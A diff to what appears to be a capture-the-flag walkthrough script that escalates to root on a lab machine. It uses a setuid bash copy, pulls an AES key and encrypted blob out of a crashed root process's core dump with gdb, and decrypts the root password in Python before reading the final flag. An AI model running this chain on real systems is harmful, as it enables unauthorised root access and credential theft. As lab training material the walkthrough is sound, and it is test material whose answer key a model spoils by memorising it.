@@ -196,15 +196,20 @@ cat /tmp/stage2_proof.txt            # proves the hop 1 -> hop 2 transition
 # back out of it.
 /tmp/opsbash -p
 file /opt/shop/backups/diagnostics/rootwatch.core
+# Select main's frame first -- at the abort() the locals key/blob/key_len/
+# blob_len are out of scope in the innermost (abort/raise) frame. key/blob
+# are heap pointers, so dump the pointed-to bytes, not the pointer.
 gdb -q -batch \
-    -ex "print/x *(unsigned char(*)[32])key" \
-    -ex "print/x *(unsigned char(*)[32])blob" \
+    -ex "frame function main" \
+    -ex "dump binary memory key.bin  key  key+key_len" \
+    -ex "dump binary memory blob.bin blob blob+blob_len" \
     /opt/shop/scripts/rootwatch/rootwatch \
     /opt/shop/backups/diagnostics/rootwatch.core
-# reconstruct nonce (first 12 bytes of blob) / ciphertext / tag (last 16
-# bytes of blob) from the second print's output, then:
-openssl enc -d -aes-256-gcm -K <key-hex> -iv <nonce-hex> \
-    -in ciphertext.bin -out password.txt   # or use cryptography's AESGCM
+# blob.bin = nonce(12) || ciphertext || tag(16). openssl enc can't verify a
+# GCM tag, so decrypt with a real AEAD call:
+python3 -c 'from cryptography.hazmat.primitives.ciphers.aead import AESGCM; \
+k=open("key.bin","rb").read(); b=open("blob.bin","rb").read(); \
+print(AESGCM(k).decrypt(b[:12], b[12:], None).decode())'
 su - root   # with the recovered password
 cat /root/final_flag
 
